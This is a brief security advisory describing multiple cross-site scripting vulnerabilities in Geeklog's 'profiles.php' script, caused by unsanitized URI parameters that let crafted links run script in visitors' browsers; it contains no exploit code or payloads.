The Geeklog 'profiles.php' script is prone to multiple cross-site scripting vulnerabilities.

This issue is due to insufficient sanitization of input submitted in URI parameters. As a result, an attacker may create a malicious link to a site hosting Geeklog, which contains malicious HTML or script code.

When such a link is visited by an unsuspecting user, attacker-supplied script code will be interpreted by their web client.
